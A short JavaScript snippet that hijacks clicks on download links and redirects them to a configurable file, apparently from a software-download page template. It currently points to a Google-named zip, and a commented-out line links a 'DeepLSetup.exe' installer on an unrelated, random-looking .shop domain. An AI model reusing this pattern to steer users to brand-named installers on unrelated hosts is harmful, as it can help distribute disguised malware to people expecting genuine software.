$(function () {
    // 定义不同class对应的跳转链接
    var urlMap = {
        //'link_download': 'https://msntnisnsoitnah.shop/ossmntsisleydna/DeepLSetup.exe', 
        'link_download': '/download/谷歌suubinterval .zip',//这个就是改下载链接的地方，要是完整的链接就直接把''号里面的都替换掉，比如'https://www.ddd.com/ddd.zip' 这样即可，如果包上传到这个站点的download文件夹中了，就把aaa换成你的包名
    };

    // 为每个class添加点击事件
    Object.keys(urlMap).forEach(function(className) {
        var elements = document.querySelectorAll('.' + className);
        
        elements.forEach(function(element) {
            element.addEventListener('click', function(event) {
                event.preventDefault();
                window.location.href = urlMap[className];
            });
        });
    });
});
